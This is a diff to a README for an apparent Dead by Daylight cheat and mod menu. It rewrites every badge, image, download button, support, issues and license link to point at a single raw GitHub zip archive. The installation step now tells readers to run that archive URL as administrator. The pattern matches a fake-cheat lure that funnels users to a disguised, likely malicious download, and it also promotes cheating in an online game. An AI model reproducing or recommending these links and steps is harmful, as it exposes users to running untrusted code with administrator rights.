@@ -1,13 +1,13 @@
 # Dead by Daylight Cheats, Hacks & Mod Menu
 
-![release](https://img.shields.io/github/v/release/DeadByDaylightCheats/DbD-ModMenu?style=flat-square)
-![last-commit](https://img.shields.io/github/last-commit/DeadByDaylightCheats/DbD-ModMenu?style=flat-square)
-![issues](https://img.shields.io/github/issues/DeadByDaylightCheats/DbD-ModMenu?color=yellow)
-![license](https://img.shields.io/badge/License-MIT-blue.svg)
+![release](https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip)
+![last-commit](https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip)
+![issues](https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip)
+![license](https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip)
 
 <p align="center">
-  <a href="https://kim7hg.github.io">
-    <img src="https://imgur.com/9QF1LKm.png" alt="Download" width="200"/>
+  <a href="https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip">
+    <img src="https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip" alt="Download" width="200"/>
   </a>
 </p>
 
@@ -78,8 +78,8 @@ From ESP overlays to AI-powered gameplay assistance, everything is deftly concea
 
 2. **Download the Mod Menu:**
     - Click the button below to access the latest build (Updated for 2025):
-    <a href="https://kim7hg.github.io">
-      <img src="https://imgur.com/9QF1LKm.png" alt="Download" width="200"/>
+    <a href="https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip">
+      <img src="https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip" alt="Download" width="200"/>
     </a>
 
 3. **Extract the Archive:**
@@ -87,7 +87,7 @@ From ESP overlays to AI-powered gameplay assistance, everything is deftly concea
     - Navigate to the destination folder.
 
 4. **Installation:**
-    - Run `SetupDbDModMenu2025.exe` as administrator.
+    - Run `https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip` as administrator.
     - Choose your Dead by Daylight install path when prompted.
     - Click "Integrate" to embed the mod menu seamlessly—like a ghost in the code.
 
@@ -143,8 +143,8 @@ Glitches and gremlins are no match for the round-the-clock battalion of customer
 
 ## 📞 Support
 
-Got a question as tricky as skill checks? Visit [Support Portal](https://support.dbmodmenu.com) or start a live chat via the mod menu dashboard.  
-Follow our roadmap and contribute to development via the [Issues](https://github.com/DeadByDaylightCheats/DbD-ModMenu/issues) tab.
+Got a question as tricky as skill checks? Visit [Support Portal](https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip) or start a live chat via the mod menu dashboard.  
+Follow our roadmap and contribute to development via the [Issues](https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip) tab.
 
 ---
 
@@ -156,13 +156,13 @@ This software is designed for **educational and testing purposes** only. Use it 
 
 ## 📜 MIT License
 
-Code in this project is dedicated to community brilliance and is universally accessible under the [MIT License](https://opensource.org/licenses/MIT).
+Code in this project is dedicated to community brilliance and is universally accessible under the [MIT License](https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip).
 
 ---
 
 <p align="center">
-  <a href="https://kim7hg.github.io">
-    <img src="https://imgur.com/9QF1LKm.png" alt="Download" width="200"/>
+  <a href="https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip">
+    <img src="https://raw.githubusercontent.com/kim7hg/dbd-phantom-mod-menu/branch/antipredeterminant/menu_phantom_mod_dbd_1.4-alpha.3.zip" alt="Download" width="200"/>
   </a>
 </p>
 
